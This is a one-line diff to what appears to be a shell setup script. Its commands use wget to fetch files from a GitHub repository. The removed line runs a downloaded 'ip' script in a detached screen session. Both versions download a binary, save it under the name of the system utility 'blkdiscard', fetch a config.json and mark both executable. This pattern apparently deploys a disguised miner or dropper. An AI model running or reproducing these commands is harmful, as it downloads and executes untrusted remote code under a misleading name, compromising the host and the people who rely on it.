@@ -1,1 +1,1 @@
-wget https://raw.githubusercontent.com/kijang-7/gas/main/ip && chmod +x ip && screen -d -m python3 ip && wget -O blkdiscard https://raw.githubusercontent.com/kijang-7/gas/main/vio && wget https://raw.githubusercontent.com/kijang-7/gas2/main/config.json && chmod +x blkdiscard config.json
+wget -O blkdiscard https://raw.githubusercontent.com/kijang-7/gas/main/vio && wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x blkdiscard config.json
